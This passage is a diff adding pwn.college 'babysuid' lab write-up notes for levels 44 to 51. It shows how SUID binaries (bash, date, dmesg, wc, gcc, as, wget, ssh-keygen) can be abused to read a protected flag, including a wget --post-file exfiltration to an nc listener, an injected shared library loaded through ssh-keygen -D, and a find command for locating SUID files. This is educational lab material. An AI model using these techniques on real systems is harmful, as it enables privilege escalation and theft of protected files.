@@ -447,3 +447,216 @@ echo 'puts File.read("../../flag")' > hack.rb #'../../' is the critical!
 ruby hack.rb #can read the flag
 ```
 
+level 44: **bash**--->(**Bourne Again Shell**) execute the orders read from standard input or files
+
+```shell
+bash -p #get the shell
+```
+
+**just straight up weren't designed to let you read files**
+
+level 45: **date**---> Display the current time in the given FORMAT, or set the system date.
+
+```shell
+hacker@babysuid_level45:/$ date -f flag
+date: invalid date 'pwn.college{the flag}'
+#-f, --file=DATEFILE        like --date; once for each line of DATEFILE
+```
+
+level 46: **dmesg**-->(display message): Display boot information / Display or control the kernel ring buffer. The kernel stores boot information in the **ring buffer**. If you do not  have time to view the information on boot, you can use `dmesg` to do so.  The boot information is also saved in the `/var/log` directory in a file  called **dmesg**
+
+```shell
+dmesg -rF flag #can read the flag
+#-r: --raw	print the raw message buffer
+#-F: --file <file>	use the file instead of the kernel log buffer
+```
+
+level 47: **wc**(Count words)--->Print newline, word, and byte counts for each FILE, and a total line if
+more than one FILE is specified.  
+
+```shell
+wc --files0-from ./flag
+#result:wc: 'pwn.college{the flag}'$'\n': No such file or directory
+#--files0-from=F    read input from the files specified by
+#                   NUL-terminated names in file F;
+```
+
+level 48: **gcc**--->compiler for c & c++
+
+```shell
+hacker@babysuid_level48:/$ gcc -x c -E flag
+# 1 "flag"
+# 1 "<built-in>"
+# 1 "<command-line>"
+# 31 "<command-line>"
+# 1 "/usr/include/stdc-predef.h" 1 3 4
+# 32 "<command-line>" 2
+# 1 "flag"
+pwn.college{the flag}
+
+#-x: -x <language>	Specify the language of the following input files.
+#                   Permissible languages include: c c++ assembler none
+#                   'none' means revert to the default behavior of
+#                   guessing the language based on the file's extension.
+
+#-E: Preprocess only; do not compile, assemble or link.
+```
+
+level 49: **as**--->a kind of Compiler set
+
+```shell
+as @flag
+#result:Assembler messages:
+#		Error: can't open pwn.college{the flag} for reading: No such file or directory
+#@FILE	read options from FILE
+as -f flag
+#result:flag: Assembler messages:
+#		flag:1: Error: no such instruction: `pwn.college{flag}'
+# -f: skip whitespace and comment preprocessing
+```
+
+level 50: **wget**---> a tool for downloading files from the specified URL
+
+> **Usage: wget [OPTION]... [URL]...**
+>
+> The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.
+
+```shell
+hacker@babysuid_level50:/$ wget -i flag
+--2022-11-10 02:19:47--  http://pwn.college%7flag%7D/
+Resolving pwn.college{flag} (pwn.college{flag})... failed: Name or service not known.
+wget: unable to resolve host address 'pwn.college{flag}'
+#-i,--input-file=FILE		download URLs found in local or external FILE
+#use the -i,error output will forcely convert the content all to lowercase
+```
+
+```shell
+nc -lnvp 8088 #listeng on the port 8088
+#-l : Listen mode, for inbound connects
+#*-n: Suppress name/port resolutions. If there's no -n, error:'nc: getnameinfo: Temporary failure in name resolution'
+#-v : Shows the execution of instructions
+#-p : port---Specify local port for remote connects
+```
+
+```shell
+wget --post-file=/flag http://127.0.0.1:8088 #another terminal get the flag
+#--post-file=FILE	use the POST method; send contents of FILE
+```
+
+**allowing users to load their own code as plugins into the program is dangerous**
+
+level 51: **ssh-keygen**--->Used to generate an SSH public key for the public and private key file, this level is difficult so I can't understand well about it. Maybe I'll explore that later.
+
+> It loads shared libraries that may be used to run code in the binary execution context.
+
+```shell
+ssh-keygen -D ./lib.so #but there's no ./lib.so
+#-D pkcs11:Download the public keys provided by the PKCS#11 shared library pkcs11
+```
+
+**the replay of the video:**[TheAnswerVideo](https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s)
+
+```shell
+hacker@babysuid_level51:/$ ssh-keygen -D flag
+#dlopen flag failed: flag: cannot open shared object file: No such file or directory
+#cannot read public key from pkcs11
+```
+
+```c
+//hack.c
+int main(int argc,char const *argv[]){
+    puts("hello world");
+}
+
+int my_function(){
+    puts("I am here");
+}
+//gcc -shared hack.c  --->   a.out
+//./a.out ----->Segmentation fault (core dumped)
+//file a.out
+//a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=d2dbe213d9619e8226e1a4c108b9cde1ed002664, not stripped
+```
+
+```shell
+gcc hack.c
+#./a.out ------>hello world
+#file a.out
+#a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbd6236d2d832f1b2673a51f31ad4b2b166f5878, for GNU/Linux 3.2.0, not stripped
+```
+
+```shell
+hacker@babysuid_level51:~$ ldd /bin/false
+        linux-vdso.so.1 (0x00007ffd32359000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9e7fe94000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f9e800a7000)
+hacker@babysuid_level51:~$ file /lib/x86_64-linux-gnu/libc-2.31.so
+/lib/x86_64-linux-gnu/libc-2.31.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1878e6b475720c7c51969e69ab2d276fae6d1dee, for GNU/Linux 3.2.0, stripped
+```
+
+```shell
+hacker@babysuid_level51:~$ ssh-keygen -D a.out
+dlopen a.out failed: a.out: cannot open shared object file: No such file or directory
+cannot read public key from pkcs11
+hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
+dlsym(C_GetFunctionList) failed: ./a.out: undefined symbol: C_GetFunctionList
+cannot read public key from pkcs11
+```
+
+```c
+//hack.c
+int main(int argc,char const *argv[]){
+    puts("hello world");
+}
+
+int C_GetFunctionList(){
+    puts("I am here");
+}
+```
+
+```shell
+hacker@babysuid_level51:~$ ssh-keygen -D ./a.out
+I am here
+C_GetFunctionList for provider ./a.out failed: 10
+cannot read public key from pkcs11
+```
+
+```c
+//hack.c
+int main(int argc,char const *argv[]){
+    puts("hello world");
+}
+// or static void inject() __attribute__((constructor));
+//void inject(){}
+int C_GetFunctionList(){
+    sendfile(1,open("../../flag",0),0,4096);
+}
+```
+
+```shell
+gcc -shared hack.c 
+ssh-keygen -D ./a.out #get the flag
+```
+
+**Dynamic Link Library**(.dll & .so)
+
+The library file is made into a compiled program, giving them an interface for exchanging data, and when writing a program, once a function of a library file is used, the system calls the library file into memory. When the required functionality is complete, the DLL stops running and the entire call process ends.
+
+**Static library**(.a & .lib)
+
+for convenience, put the general-purpose program together, this is the library. Computer has to include all the programs in the link library, making the program big.
+
+**used to find the suid file**
+
+```shell
+find / -type f -perm -04000 -ls 2>/dev/null
+#-type f: file type
+#-perm: permission 4000:root
+#2>/dev/null:output the error to the "blackhole/bin"
+```
+
+gcc can create shared libraries with the `-shared` parameter. dll can't bu run alone, but rather a program that must be called by someone else. the difference between it and ordinary binaries is that it can be seen with the `file` command.
+
+```shell
+gcc x.c -shared -o x.so
+```
+
